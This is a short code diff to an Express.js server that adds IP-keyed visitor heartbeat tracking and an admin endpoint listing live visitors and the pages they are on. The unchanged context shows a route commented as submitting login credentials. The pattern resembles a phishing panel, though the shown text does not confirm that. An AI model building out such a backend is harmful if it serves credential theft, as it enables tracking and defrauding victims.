@@ -26,6 +26,29 @@ function getClientIp(req) {
   return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || req.ip || '';
 }
 
+// Visitor tracking (in-memory)
+const visitors = new Map();
+const VISITOR_TIMEOUT = 15000;
+
+app.post('/api/heartbeat', (req, res) => {
+  const ip = getClientIp(req);
+  const page = String(req.body.page || 'unknown');
+  visitors.set(ip, { page, ts: Date.now() });
+  res.json({ ok: true });
+});
+
+app.get('/api/admin/visitors', (req, res) => {
+  if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
+  const now = Date.now();
+  let count = 0;
+  const pages = [];
+  visitors.forEach((v, ip) => {
+    if (now - v.ts < VISITOR_TIMEOUT) { count++; pages.push(v.page); }
+    else visitors.delete(ip);
+  });
+  res.json({ ok: true, count, pages });
+});
+
 // Submit login credentials
 app.post('/api/submit', async (req, res) => {
   try {
